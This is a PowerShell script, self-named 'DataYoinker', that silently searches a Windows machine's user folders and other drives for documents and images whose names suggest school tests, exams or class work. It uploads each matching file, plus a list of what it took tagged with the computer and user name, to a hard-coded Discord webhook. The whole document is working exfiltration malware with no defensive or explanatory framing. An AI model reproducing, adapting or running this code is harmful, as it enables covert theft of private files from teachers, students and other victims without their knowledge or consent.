[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$WebhookUrl = 'https://discord.com/api/webhooks/1475555831503257924/tjmgaj9pGfI_TtemltPt0UKeTwoKKesjHNzVopFFUvNeYXY7a8PnqtQGt2OlgR40jQ0Q'
$WebhookUrl = $WebhookUrl.Trim()
$SearchRoots = ("C:\Users", "E:\", "D:\")
$Extensions = @("*.docx", "*.pdf", "*.jpeg", "*.doc", "*.dotx") # accepted extensions 
$Keywords = @("PD", "_pd_", "_PD_", "parbaude", "9kl", "10kl", "8kl", "7kl", "6kl", "5kl", "4kl", "3kl", "2kl", "1kl", "darbs", "DARBS", "test", "exam", "klase", "class", "progress", "matem", "math", "pdar") # file keywords
$MaxFileSizeMB = 8
$MaxBytes = $MaxFileSizeMB * 1MB
$Queue = New-Object System.Collections.Generic.Queue[string]
$SentFiles = New-Object System.Collections.Generic.List[string]
$PCName = $env:COMPUTERNAME
$UserName = $env:USERNAME
$sessionID = Get-Content -Path "$env:TEMP\dyoink.txt" -TotalCount 1
$SeenFiles = @{}
foreach ($Root in $SearchRoots) {
    foreach ($Ext in $Extensions) {
        Get-ChildItem $Root -Filter $Ext -Recurse -ErrorAction SilentlyContinue |
        Where-Object { -not $_.PSIsContainer -and $_.Length -le $MaxBytes } |
        ForEach-Object {
            $File = $_
            $Matched = $false
            foreach ($Key in $Keywords) {
                if ($File.BaseName -like "*$Key*") {
                    $Matched = $true
                    break
                }
            }

            if ($Matched) {
                if (-not $SeenFiles.ContainsKey($File.FullName)) {
                    $Queue.Enqueue($File.FullName)
                    $SeenFiles[$File.FullName] = $true
                }
            }
        }
    }
}
function Send-DiscordFile {
    param (
        [string]$FilePath
    )
    $MaxRetries = 10
    $RetryDelay = 10

    $Boundary = [System.Guid]::NewGuid().ToString()
    $FileName = [System.IO.Path]::GetFileName($FilePath)
    $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)

    $Header = (
        "--$Boundary`r`n" +
        "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"`r`n" +
        "Content-Type: application/octet-stream`r`n`r`n"
    )
    $Footer = "`r`n--$Boundary--`r`n"

    $Stream = New-Object System.IO.MemoryStream
    $Writer = New-Object System.IO.BinaryWriter($Stream)

    $Writer.Write([System.Text.Encoding]::UTF8.GetBytes($Header))
    $Writer.Write($FileBytes)
    $Writer.Write([System.Text.Encoding]::UTF8.GetBytes($Footer))
    $Writer.Flush()

    for ($Attempt = 1; $Attempt -le $MaxRetries; $Attempt++) {
        try {
            Invoke-RestMethod `
                -Uri $WebhookUrl `
                -Method Post `
                -ContentType "multipart/form-data; boundary=$Boundary" `
                -Body $Stream.ToArray()
            return
        }
        catch {
            if ($_.Exception.Response -and $_.Exception.Response.StatusCode.Value__ -eq 429) {
                if ($Attempt -eq $MaxRetries) {
                    throw "Discord rate limit hit. Failed after $MaxRetries retries."
                }

                Start-Sleep -Seconds $RetryDelay
            }
            else {
                throw
            }
        }
    }
}
while ($Queue.Count -gt 0) {
    $File = $Queue.Dequeue()
    try {
        Send-DiscordFile -FilePath $File
        $SentFiles.Add($File)
    } catch {
    }
    Start-Sleep 1
}

if ($SentFiles.Count -gt 0) {
    $TextContent = @"
$($SentFiles.Count)x Files sent from ($PCName-$UserName`_$sessionID)
SESSION ID $sessionID

$($SentFiles -join "`n")

Thanks for using DataYoinker!
"@
    $TempTxt = Join-Path $env:TEMP "sentfiles_$sessionID.txt"
    Set-Content -Path $TempTxt -Value $TextContent -Encoding UTF8

    try {
        Send-DiscordFile -FilePath $TempTxt
    } catch {
    }
    Remove-Item $TempTxt -Force
}
